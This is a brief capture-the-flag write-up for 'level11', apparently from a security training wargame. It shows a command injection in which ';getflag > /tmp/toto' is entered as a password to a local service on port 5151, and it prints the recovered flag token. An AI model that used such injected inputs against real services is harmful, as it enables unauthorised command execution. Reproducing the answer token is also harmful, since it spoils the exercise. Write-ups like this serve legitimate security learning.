# level11

- Our input is passed in a concatenated shell command so we can try to escape it
    ```sh
    $ telnet 0 5151
    Trying 0.0.0.0...
    Connected to 0.
    Escape character is '^]'.
    Password: ;getflag > /tmp/toto
    ```

- We can find the result in `/tmp/toto` so `$ cat /tmp/toto`
    > Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s

